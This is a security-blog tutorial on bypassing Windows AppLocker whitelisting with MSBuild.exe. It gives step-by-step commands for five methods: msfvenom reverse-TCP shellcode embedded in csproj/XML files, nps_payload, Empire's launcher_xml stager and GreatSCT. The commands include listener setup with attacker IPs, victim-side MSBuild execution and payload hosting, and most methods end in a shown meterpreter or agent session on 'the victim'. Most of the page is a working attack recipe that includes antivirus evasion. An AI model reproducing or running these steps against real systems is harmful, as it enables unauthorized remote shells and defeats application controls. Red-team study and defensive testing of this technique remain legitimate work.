<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a>, <a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/" rel="category tag">Windows Exploitation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Exploitation: msbuild</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-exploitation-msbuild/" rel="bookmark"><time class="entry-date published" datetime="2019-01-22T07:54:48+00:00">January 22, 2019</time><time class="updated" datetime="2025-05-16T10:52:48+00:00">May 16, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">The purpose of this post is to demonstrate the most common and familiar techniques of whitelisting AppLocker bypass.  As we know for security reason, the system admin adds group policies to restrict app execution for the local user. In our previous article, we had discussed on “<strong><span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/">Windows Applocker Policy – A Beginner’s Guide</a></span></strong>” as they define the AppLocker rules for your application control policies and how to work with them. But today you will learn how to bypass Applocker policies with MSbuild.exe.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;"><strong>Introduction to MSbuild.exe</strong></span></p>
<p><span style="color: #000000;"><strong>Exploiting Techniques </strong></span></p>
<ul>
<li><span style="color: #000000;">Generate CSharp file with Msfvenom</span></li>
<li><span style="color: #000000;">Generate XML file to Exploit MSbuild</span></li>
<li><span style="color: #000000;">Nps_payload Script</span></li>
<li><span style="color: #000000;">Powershell Empire</span></li>
<li><span style="color: #000000;">GreatSCT</span></li>
</ul>
<h3><span style="color: #800000;">Introduction to MSbuild.exe</span></h3>
<p><span style="color: #000000;">The Microsoft Build Engine is a platform for building applications. This engine, known as MSBuild, provides an XML schema for a project file that controls how the build platform processes and builds software. MSBuild works with Visual Studio, but Visual Studio doesn’t depend on MSBuild. By invoking msbuild.exe on your project or solution file, you can organize and build products in environments where developers haven’t installed Visual Studio.</span></p>
<p><span style="color: #000000;">Visual Studio uses MSBuild to load and build managed projects. The project files in Visual Studio (<em>.csproj</em>, <em>.vbproj</em>, <em>.vcxproj</em>, and others) contain MSBuild XML code.</span></p>
<h3><span style="color: #800000;">Exploiting Techniques</span></h3>
<h4><span style="color: #000000;">Generate CSharp file with Msfvenom</span></h4>
<p><span style="color: #000000;">We use Microsoft Visual Studio to create C # (C Sharp) programming project with a <strong>*.csproj</strong> suffix that saved in MSBuild format so that it can be compiled with the MSBuild platform into an executable program.</span></p>
<p><span style="color: #000000;">With the help of a malicious build, we can obtain a reverse shell of the victim’s machine. Therefore, now we will generate our file.csproj file and for that, first generate a shellcode of c# via msfvenom. Then later that shellcode will be placed inside our file.csproj as given below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f csharp</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Zm7GyvQAHmQ/XEbGch8EgoI/AAAAAAAAcQE/QHv57yC2ypwKLU7RI5axwJ9jZr9-enGogCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Place the shellcode generated above in the XML file, and you can download this XML file from <span style="color: #3366ff;"><a style="color: #3366ff;" href="//raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml">GitHub</a></span>, which contains the code that MSBuild compiles and executes. Save this XML file as file.csproj and run it via MSBuild to get a Meterpreter session.</span></p>
<h5><span style="color: #000000;"><strong><em>Note: Replace the shellcode value from your C# shellcode and then rename <span style="color: #800000;">buf </span>as <span style="color: #800000;">shellcode</span> as shown in the below image. </em></strong></span></h5>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-6ujRJ5TRcOs/XEbGe3w72xI/AAAAAAAAcQo/J9KzGL_ic_kjqAg-7qLo88R-ObS2xL6nwCLcBGAs/s1600/2.png" alt="Windows Exploitation using MSBuild" width="847" height="942"/></span></p>
<p><span style="color: #000000;">You can run MSBuild from Visual Studio, or from the Command Window. By using Visual Studio, you can compile an application to run on any one of several versions of the .NET Framework. </span></p>
<p><span style="color: #000000;">For example, you can compile an application to run on the .NET Framework 2.0 on a 32-bit platform, and you can compile the same application to run on the .NET Framework 4.5 on a 64-bit platform. The ability to compile to more than one framework is named multitargeting.</span></p>
<p><span style="color: #000000;">To know more about MSBuild read from here: <span style="color: #3366ff;"><a style="color: #3366ff;" href="//docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2015"><em>//docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2015</em></a></span></span></p>
<p><span style="color: #000000;">Now launch multi handler to get meterpreter session and run the file.csproj file with msbuild.exe at the target path: C:\Windows\Microsoft.Net\Framework\v4.0.30319 as shown.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe file.csproj</pre>
<p><span style="color: #000000;"><em><strong>Note</strong>: you need to save your malicious payload (XML / csproj) at this location: </em></span></p>
<p><span style="color: #000000;"><em>C:\Windows\Microsoft.NET\Framework\v4.0.30319\ and then execute this file with a command prompt.</em></span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-3eVE3__pUYE/XEbGfD-uzGI/AAAAAAAAcQw/Tu0GYPubWc4pJFIfHyJPtSPlOqQLBUp2QCLcBGAs/s1600/3.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.109
msf exploit(multi/handler) &gt; set lport 1234
msf exploit(multi/handler) &gt; exploit</pre>
<p><span style="color: #000000;">As you can observe, we have the meterpreter session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//2.bp.blogspot.com/-K4QqfPZ3FBA/XEbGfvysA_I/AAAAAAAAcQ0/1AjfvIGKuaIKg8by6qtjTxP7WlJnPGougCLcBGAs/s1600/4.png" alt="Windows Exploitation using MSBuild" width="783" height="407"/></span></p>
<h3><span style="color: #800000;">Generate XML file to Exploit MSBuild</span></h3>
<p><span style="color: #000000;">As mentioned above, MSBuild uses an XML- based project file format that is straightforward and extensible, so we can rename the generated file.csproj as file.xml and again run the file.xml with msbuild.exe on the target path: C:\Windows\Microsoft.Net\Framework\v4.0.30319 as shown.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe file.xml</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-3PV2zh8phbY/XEbGfuXdFlI/AAAAAAAAcQ4/FIBmk_0YhcEiWB3JzSlXl3OPbxWBMnUqACLcBGAs/s1600/5.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.109
msf exploit(multi/handler) &gt; set lport 1234
msf exploit(multi/handler) &gt; exploit</pre>
<p><span style="color: #000000;">As you can observe, we have the meterpreter session of the victim as shown below:</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//1.bp.blogspot.com/-gtaRIy5gN6A/XEbGf2jQGZI/AAAAAAAAcQ8/IqCbNH2yS9YSPJ-BfF-yl9-4N_YDA2UqQCLcBGAs/s1600/6.png" alt="Windows Exploitation using MSBuild" width="750" height="404"/></span></p>
<h3><span style="color: #800000;">Nps_Payload Script</span></h3>
<p><span style="color: #000000;">This script will generate payloads for basic intrusion detection avoidance. It utilizes publicly demonstrated techniques from several different sources. Written by Larry Spohn (@Spoonman1091) Payload written by Ben Mauch (@Ben0xA) aka dirty_ben. You can download it from <strong><span style="color: #3366ff;"><a style="color: #3366ff;" href="//github.com/trustedsec/nps_payload">github</a></span></strong>.</span></p>
<p><span style="color: #000000;">Nps_payload generates payloads that could be executed with msbuild.exe and mshta.exe to get the reverse connection of the victim’s machine via the meterpreter session.</span></p>
<p><span style="color: #000000;">Follow the below step for generating payload:</span></p>
<ol>
<li><span style="color: #000000;">Run <strong>./nps_payload.py</strong> script, once you have downloaded nps payload from GitHub</span></li>
<li><span style="color: #000000;">Press <strong>key 1</strong> to select task “generate msbuild/nps/msf”</span></li>
<li><span style="color: #000000;">Again Press key 1 to select payload “windows/meterpreter/reverse_tcp”</span></li>
</ol>
<p><span style="color: #000000;">This will generate a payload in the XML file, send this file at target location C:\Windows\Microsoft.Net\Framework\v4.0.30319 as done in the previous method and simultaneously run below command in a new terminal to start the listener.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r msbuild_nps.rc</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-tNkz_VzrMyQ/XEbGgH_cnYI/AAAAAAAAcRA/2HRxW99iJAckyChsYsESyOq_YeE5dXAYwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now repeat the above step to execute msbuild_nps.xml with command prompt and obtain a reverse connection via meterpreter as shown below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild_nps.xml</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-t9DrOuLl0B4/XEbGgI2u-aI/AAAAAAAAcRE/XS2BaNP6SsImCOcvkejqIgz1gEWG2yPAQCLcBGAs/s1600/9.png" alt="Windows Exploitation using MSBuild" width="785" height="580"/></span></p>
<h3><span style="color: #800000;">PowerShell Empire</span></h3>
<p><span style="color: #000000;">For our next method of msbuild Attack, we will use empire. Empire is a post-exploitation framework. Till now we have paired our XML tacks with Metasploit but in this method, we will use empire framework. It’s solely a python-based PowerShell windows agent which makes it quite useful. Empire is developed by @harmj0y, @sixdub, @enigma0x3, rvrsh3ll, @killswitch_gui, and @xorrior. You can download this framework from </span><a href="https://github.com/BC-SECURITY/Empire"><strong><span style="color: #3366ff;">Here</span></strong></a></p>
<p><span style="color: #000000;">To have a basic guide of Empire, please visit our article introducing empire:</span></p>
<p><span style="color: #3366ff;"><a style="color: #3366ff;" href="https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/">https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/</a></span></p>
<p><span style="color: #000000;">Once the empire framework is started, type listener to check if there are any active listeners. As you can see in the image below that there are no active listeners. So to set up a listener type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselistner http
set Host //192.168.1.107
execute</pre>
<p><span style="color: #000000;">With the above commands, you will have an active listener. Type back to go out of listener so that you can initiate your PowerShell.</span></p>
<h5><strong><span style="color: #000000;">Launching PowerShell</span></strong></h5>
<p><span style="color: #000000;">For our MSBuild attack, we will use a stager. <strong> </strong>A stager, in the empire, is a snippet of code that allows our malicious code to be run via the agent on the compromised host. So, for this type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_xml
set Listener http
execute</pre>
<p><span style="color: #000000;">Usestager will create a malicious code file that will be saved in the /tmp named launcher.xml.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-qOOzLH_zLXs/XEbGcmZi7PI/AAAAAAAAcP8/Mq_t9Ko5ff8T7qVW0rjA2mlSTGY22ro2ACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">And once the file runs, we will have the result on our listener. Run the file in your victim’s by typing following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Windows\Microsoft.NET\Framework\v4.0.30319\
MSBuild.exe launcher.xml</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-9u3oLZ_hrCo/XEbGcmrjjXI/AAAAAAAAcQA/67zFM39Sn4ofoduqTOsRhjxqKKxFDt91ACLcBGAs/s1600/11.png" alt="Windows Exploitation using MSBuild" width="675" height="321"/></span></p>
<p><span style="color: #000000;">To see if we have any session open type ‘agents’. Doing so will show you the name of the session you have. To access that session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact A8H14C7L</pre>
<p><span style="color: #000000;">The above command will give you access to the session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Q95hpYYAiQc/XEbGdHRTCDI/AAAAAAAAcQI/IXOkKHMWV3gvaJCRUS5mBEhxjRrxdS7xACLcBGAs/s1600/12.png"/></span></p>
<h3><span style="color: #800000;">GreatSCT</span></h3>
<p><span style="color: #000000;">GreatSCT is a tool that allows you to use Metasploit exploits and lets it bypass most anti-viruses. It is currently under support by @ConsciousHacker. You can download it from here: <a href="//github.com/GreatSCT/GreatSCT"><span style="color: #3366ff;"><em>//github.com/GreatSCT/GreatSCT</em></span></a></span></p>
<p><span style="color: #000000;">After you download and run it, type the following command to access the modules:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use Bypass</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-KvnDk1niYa8/XEbGde9VrCI/AAAAAAAAcQQ/6WY0XdPw9hQ9nQS769vY75czs-sX9f11QCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now to see the list of payloads type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">list</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-MPKkcv7SdQc/XEbGdcYbYOI/AAAAAAAAcQM/xahgOjrav9gxssCBkEXi2NqR4H5hNvk4QCLcBGAs/s1600/14.png" alt="Windows Exploitation using MSBuild" width="737" height="386"/></span></p>
<p><span style="color: #000000;">Now from the list of payloads, you can choose anyone for your desired attack. But for this attack we will use :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use msbuild/meterpreter/rev_tcp.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-x3QSMnEyBCA/XEbGdbZspCI/AAAAAAAAcQU/ufBuaVh0nSwfYt6HJfc0xZLtbvOYb4IXwCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Once the command is executed, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set lhost 192.168.1.107
generate</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-ZTwCA0ZaBxA/XEbGd2fGxZI/AAAAAAAAcQc/QGEJg9yUspoEL-Byr4pWwQAu6jCvzByPgCLcBGAs/s1600/16.png" alt="Windows Exploitation using MSBuild" width="818" height="779"/></span></p>
<p><span style="color: #000000;">While generating the payload, it will ask you to give a name for a payload. By default, it will take ‘payload’ as the name. We named the payload msbuild, where the output code will be saved in XML.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-aF72G5PkBtc/XEbGd654W8I/AAAAAAAAcQY/pew5lNqtJyUkCZ4mw5OdKtbqaqZQI3kUwCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now, it made two files. One Metasploit RC file and other a msbuild.xml file.</span></p>
<p><span style="color: #000000;">Now, firstly, start the python’s server in /usr/share/greatsct-output/source by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-ac2m9SAv5uQ/XEbGeOIHV6I/AAAAAAAAcQg/9CB8NhFEhd4McEOCsf2H9D4I2N0V5po2gCLcBGAs/s1600/18.png" alt="Windows Exploitation using MSBuild" width="781" height="304"/></span></p>
<p><span style="color: #000000;">Run the file in your victim’s by typing following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Windows\Microsoft.NET\Framework\v4.0.30319\
MSBuild.exe msbuild.xml</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-ZnaFg9dTzpU/XEbGeT26MDI/AAAAAAAAcQk/yfStwxKsOFYTC3uD549JT95BjqsXsCkUgCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Simultaneously, start the multi/handler using the resource file. For this, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r /usr/share/greatsct-output/handlers/payload.rc</pre>
<p><span style="color: #000000;">And voila! We have a meterpreter session as shown here.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-ktaWF2MoINg/XEbGe3bw2UI/AAAAAAAAcQs/gDm-QxOzQaA5B4zhwfXAATrUawJ5oZPKQCLcBGAs/s1600/20.png" alt="Windows Exploitation using MSBuild" width="810" height="407"/></span></p>
<p><span style="color: #000000;">To learn more about Windows Exploitation. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/">Link.</a></strong></p>
<p><span style="color: #000000;">Reference: <a href="//docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2017">//docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2017</a></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. contac</span>t<strong><a href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
